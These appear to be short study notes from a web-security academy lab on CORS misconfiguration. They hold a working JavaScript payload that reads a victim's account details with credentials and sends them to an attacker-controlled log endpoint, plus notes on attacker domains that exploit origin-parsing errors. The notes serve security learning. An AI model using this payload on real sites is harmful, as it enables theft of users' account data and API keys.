____

![[Pasted image 20250127181648.png]]

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0a1100170345bf0c80f01209004f0064.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

____
Errors parsing Origin headers

suppose an application grants access to all domains ending in:
`normal-website.com`
An attacker might be able to gain access by registering the domain:
`hackersnormal-website.com`
Alternatively, suppose an application grants access to all domains beginning with
`normal-website.com`
An attacker might be able to gain access using the domain:
`normal-website.com.evil-user.net`

____
The specification for the Origin header supports the value `null`

